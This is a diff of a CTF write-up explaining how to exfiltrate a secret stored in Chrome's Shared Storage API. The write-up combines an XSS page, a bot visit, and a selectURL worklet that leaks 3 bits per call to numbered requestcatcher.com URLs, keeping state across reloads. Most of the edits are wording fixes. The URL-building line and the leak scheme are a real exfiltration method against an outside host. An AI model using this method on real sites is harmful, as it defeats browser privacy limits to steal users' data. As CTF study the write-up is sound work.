@@ -14,6 +14,9 @@ basically replicating my own feelings upon completing this challenge and having 
 Note that this will be a long write-up that goes through all of the analysis, each painful step at a time.
 Feel free to jump to the [summary](#summary) and [solution](#solution) at the end if you're short on time!
 
+Also, my opinion of the `Shared Storage API` we're about to cover:
+perfectly fine though tedious API; obnoxious to try to get around in a CTF context!
+
 ## Challenge
 import { Image } from 'astro:assets';
 import challenge from 'challenge.png';
@@ -171,7 +174,7 @@ allowing you to see any `console.log`s, use devtools, etc.
 Furthermore, consider commenting out the `await browser.close();`s, as well.
 Just be sure to close the browser fully before using the app, since it doesn't like running when the browser is still up.
 
-I also recommend getting rid of the 96 second throttle, as well.
+I also recommend getting rid of the 95 second throttle, as well.
 
 ### Shared storage API overview
 This API is simultaneously well documented and poorly documented.
@@ -212,6 +215,7 @@ A bit further down [the page](https://privacysandbox.google.com/private-advertis
 So I guess there's a `get` function, but we can't call it directly.
 We can only use these two APIs -- which presumably can use `get` -- to see what's in `sharedStorage`.
 No problem, right? We just need to use one of these APIs to call `get` and later leak it via `fetch`!
+(Spoiler alert: nope)
 
 [The demos](https://github.com/GoogleChromeLabs/shared-storage-demo) ([running examples](https://shared-storage-demo.web.app/))
 are probably the best way to see these APIs in action.
@@ -312,8 +316,7 @@ Well, first, we can at least see what it looks like via `chrome://private-aggreg
 
 <Image src={example_privagg} alt='Private aggregation histogram example' />
 
-We apparently have the histogram waiting to get sent off,
-as well as a "report body" JSON containing a `aggregation_coordination_origin` field.
+We can see the original histogram, as well as a "report body" JSON that presumably gets sent somewhere.
 
 According to the API's ["key concepts"](https://privacysandbox.google.com/private-advertising/private-aggregation/overview#key_concepts):
 > When you call the Private Aggregation API with an aggregation key and an aggregatable value,
@@ -473,7 +476,7 @@ but there is [another good source](https://github.com/WICG/shared-storage/blob/m
 > The worklet selects from a small list of (up to 8) URLs, each in its own dictionary with optional reporting metadata.
 
 This is surely to avoid leaking data.
-In any case, it seems we can only leak 3 bits of information at a time.
+In any case, it seems we can only leak 3 bits of information at a time -- 2^(3 urls).
 ```js
 const urls = Array.from(Array(8), (_, i) => { return { url: `https://wanchan.requestcatcher.com/${i}` } });
 ```
@@ -491,14 +494,14 @@ function parse(raw) {
 Let's do something of a reverse binary search, except, instead of splitting a range into two, we'll split it into eight.
 It's not *really* a binary search, since our worklet can actually see the value, but whatever.
 For example, let's say our `secret` was somewhere between 0 and 15.
-* 0-1: https://wanchan.requestcatcher.com/0
-* 2-3: https://wanchan.requestcatcher.com/1
-* 4-5: https://wanchan.requestcatcher.com/2
-* 6-7: https://wanchan.requestcatcher.com/3
-* 8-9: https://wanchan.requestcatcher.com/4
-* 10-11: https://wanchan.requestcatcher.com/5
-* 12-13: https://wanchan.requestcatcher.com/6
-* 14-15: https://wanchan.requestcatcher.com/7
+* 0-1: `https://wanchan.requestcatcher.com/0`
+* 2-3: `https://wanchan.requestcatcher.com/1`
+* 4-5: `https://wanchan.requestcatcher.com/2`
+* 6-7: `https://wanchan.requestcatcher.com/3`
+* 8-9: `https://wanchan.requestcatcher.com/4`
+* 10-11: `https://wanchan.requestcatcher.com/5`
+* 12-13: `https://wanchan.requestcatcher.com/6`
+* 14-15: `https://wanchan.requestcatcher.com/7`
 
 This is the sort of operation we'll perform multiple times until we get down to the precise value.
 The worklet still needs some way to keep track of this state, as well. 
@@ -565,8 +568,7 @@ followed by the 4th range within that, followed by the 3rd range within that.
 
 I did it this way for "efficiency reasons",
 but a fully sufficient and cleaner way to implement it would have been to just track the iteration index.
-For instance, if `0`, we'd compute `1`, as per the example above. Then, for `1`, we'd redo the work to find `1`,
-then do the work to find the `4`th range within that.
+Instead of storing the steps, we would simply recompute the set of steps each time we run the worklet.
 
 Up to you!
 
@@ -581,7 +583,7 @@ That would be 18 bits of information leaked -- not enough!
 My next thought was to track it in the main script, where we call the worklet.
 However, we can't do this, since we don't see the url.
 
-#### Can we use `sharedStorage`
+#### Can we use `sharedStorage`?
 The next obvious place to track state is via `sharedStorage`.
 Now, up until around this point, I was worried about something called `entropy budget`.
 This is more or less a value tracked by the browser to ensure excessive leakage isn't allowed.
@@ -594,7 +596,8 @@ Both are wrong! The **main demo page** has the clearest explanation:
 > Whenever the fenced frame navigates the top-level frame to another page, the entropy budget is decreased.
 > This demo shows allows you to see how the budget decreases. 
 
-This scenario happens, for instance, when someone clicks a link inside the `fencedframe`.
+This scenario happens, for instance, when someone clicks a link inside the `fencedframe`,
+causing the main page to navigate.
 In any case, the budget doesn't decrease simply be reading state, so we could use this.
 
 #### Via `sessionStorage`
@@ -617,8 +620,8 @@ class Worklet {
 // ...
 ```
 
-Within the worklet, we'd store each new step we calculated in `steps`.
-Over where we call the worklet, we just call it as many times as needed.
+Within the worklet, we’d store each new step we calculated in `steps`.
+Over in the main script, we just call the worklet as many times as needed.
 ```js
     const run = async (frame) => {
         const url = await worklet.selectURL("run", urls, { data: { steps }, resolveToConfig: true, keepAlive: true });
@@ -652,7 +655,7 @@ Well, this is [covered in the docs](https://privacysandbox.google.com/private-ad
 > Any remaining budget for the day is calculated as `12 - (sum of bits deducted in the last 24 hours)`.
 > If there's not enough budget left,
 > the default URL (the first URL in the list) is returned and 1 bit is logged if the default URL is navigated to.
-> **Short-term budgets**: Short-term budgets are additional limits on a per page load basis
+> * **Short-term budgets**: Short-term budgets are additional limits on a per page load basis
 > until fenced frames are fully enforced and while event-level reporting is available.
 > There is a budget of **6 bits per calling site, per page load**
 > that limits how much a single calling site can leak using `selectURL()`.
@@ -686,7 +689,7 @@ Luckily, it was at this point I grew suspicious of my understanding of entropy b
 ran some tests, and verified using `sharedStorage` to store our data is viable.
 This data would survive page refreshes, so we can do it all in one go.
 
-#### Via sharedStorage
+#### Via `sharedStorage`
 Here's what the initial structure of the worklet looks like:
 ```js
 class Worklet {
@@ -729,7 +732,7 @@ About the app:
 * The app stores messages in browser `sharedStorage` via the `/` route.
 * There is a `/flag` route that takes a CRNG 64-bit hex string generated on startup, returning the flag.
 * There is an `/xss?xss=` route that will return arbitrary HTML pages (no sanitizing or anything).
-* There is a `/bot` route that will visit some user-provided url by launching Chrome via `puppeteer`
+* There is a `/bot` route that will visit some user-provided url by launching Chrome via `puppeteer`.
   * First, it will visit `http://localhost:3000/` to set a message equal to the 64-bit secret.
   * Then, it will navigate to the user-provided url.
 * The `/bot` route is throttled to once every 95 seconds.
@@ -751,7 +754,7 @@ Regarding `sharedStorage`:
   * This numeric index is used by the `sharedStorage.selectUrl()`, to pick from a list of urls.
   * `sharedStorage.selectUrl` returns an opaque url, and it is impossible to tell what it points to.
   * These urls can be used in `<fencedframe>` or `<iframe>` elements, which will navigate to the url.
-  * `sharedStorage.selectUrl` can be provided up to 8 urls, which can hypothetically leak 8 bits of information (2^3).
+  * `sharedStorage.selectUrl` can be provided up to 8 urls, which can hypothetically leak 3 bits of information (log_2(8)).
   * Calling `sharedStorage.selectUrl` consumes a local entropy budget of 6, per page load.
     * So, if providing 8 urls, 3 bits of this budget are consumed. Only two such calls can be done per page load.
   * The local entropy budget resets back to 6 on reload.
@@ -773,7 +776,7 @@ Regarding coming up with a solution:
 * The worklet can only run twice per page load, given the 6-bit local entropy budget.
 * We will need to refresh the page to continue running the worklet.
 * The worklet needs to store some state so that it knows which index to return.
-  * For instance, should it return the index for range `4-7` or the index for the subsequent range: `6-7`?
+  * For instance, should it return the index for range `4-7` or the index for a subsequent range inside of it like `6-7`?
 * We will store state via `sharedStorage`, because it survives page refreshes,
   and we only need to read the data within the worklet.
 * We will store the set of steps processed so far. It's also possible store the iteration count.
